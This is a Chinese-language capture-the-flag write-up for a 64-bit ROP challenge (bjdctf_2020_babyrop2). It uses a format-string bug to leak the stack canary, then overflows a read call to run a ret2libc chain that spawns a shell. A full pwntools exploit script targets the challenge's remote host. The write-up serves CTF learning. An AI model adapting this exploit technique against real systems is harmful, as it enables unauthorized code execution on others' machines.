这是一道64位的ROP

![image-20201202161419033](https://static.hack1s.fun/images/2021/02/06/image-20201202161419033.png)

开启了canary栈保护

程序流程主要是首先一个gift输出了一些内容，之后vuln溢出

![image-20201202161745504](https://static.hack1s.fun/images/2021/02/06/image-20201202161745504.png)

vuln中的read导致溢出

![image-20201202161808839](https://static.hack1s.fun/images/2021/02/06/image-20201202161808839.png)

gift中其实也存在这样一个格式化字符串的漏洞

这里应该是要用printf来泄漏栈中canary的值

之后用read来ret2libc



那么首先来找format的偏移

一个一个尝试之后发现偏移在`%6$p`这里

![image-20201202171146730](https://static.hack1s.fun/images/2021/02/06/image-20201202171146730.png)

看到gift的代码中，保存cookie的v2在`rbp-8h`，格式化字符串在`rbp-10h`，两者差了8

正好是一个参数的距离，所以cookie的位置应该就是`%7$p`

确定了这个cookie之后，那么第一次使用printf首先得到输出的canary值

之后在构造栈上的填充时把这些内容放上去就可以了

```python
payload = bytes('a'*0x18,'ascii') + p64(canary) + bytes('b'*0x8,'ascii') + p64(pop_rdi_ret) + p64(elf.got['read']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
```

之后就是常规的ret2libc

```python
from pwn import *
from LibcSearcher import *

io =remote('node3.buuoj.cn',27445)
#io = process('./bjdctf_2020_babyrop2')
elf = ELF('./bjdctf_2020_babyrop2')

io.recvuntil('help u!\n')
io.sendline("%7$p")

canary = int(io.recvline()[:-1],16)

io.recvuntil('story!\n')

pop_rdi_ret = 0x400993
pop_rsi_r15_ret = 0x400991

payload = bytes('a'*0x18,'ascii') + p64(canary) + bytes('b'*0x8,'ascii') + p64(pop_rdi_ret) + p64(elf.got['read']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

io.sendline(payload)

read_real = io.recv(6).ljust(8,b'\0')
read_real = u64(read_real)

libc = LibcSearcher('read',read_real)
libc_base = read_real - libc.dump('read')

system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

io.recvuntil('help u!\n')
io.sendline("%7$p")

canary = int(io.recvline()[:-1],16)
io.recvuntil('story!\n')

payload = bytes('a'*0x18,'ascii') + p64(canary) + bytes('b'*0x8,'ascii') + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(elf.sym['main'])
io.sendline(payload)

io.interactive()
```

